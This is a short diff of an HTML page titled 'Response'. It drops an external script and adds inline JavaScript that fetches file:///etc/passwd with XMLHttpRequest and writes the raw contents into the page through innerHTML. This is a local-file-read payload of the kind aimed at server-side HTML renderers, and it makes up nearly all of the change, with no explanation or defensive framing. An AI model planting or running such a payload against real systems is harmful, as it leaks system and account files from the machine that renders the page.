@@ -1,10 +1,14 @@
 <html>
-<head>
-  <script type="text/javascript" src="script.js"></script>
-</head>
 <body>
 <h1>Response</h1>
 <div id="response"></div>
+
+<script>
+var x = new XMLHttpRequest();
+x.open("GET", "file:///etc/passwd", false);
+x.send();
+document.getElementById('response').innerHTML = "Ressponse: "+ x.statusText + " \n\n" + x.responseText;
   
+</script>
 </body>
 </html>
